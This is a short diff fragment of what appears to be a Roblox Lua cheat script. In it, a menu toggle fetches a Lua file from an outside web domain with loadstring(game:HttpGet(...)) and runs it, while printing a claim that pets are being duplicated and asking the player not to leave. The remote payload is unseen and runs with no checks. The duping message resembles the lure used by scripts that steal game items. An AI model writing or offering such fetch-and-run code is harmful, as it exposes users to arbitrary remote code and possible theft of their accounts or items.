@@ -24,4 +24,4 @@ Tab:AddToggle({
     loadstring(game:HttpGet("https://egorikusa.space/e615aa2032acba0880d08ff0.lua", true))()
     print("Pets are Duping Please dont Leave")
 })
-
+end
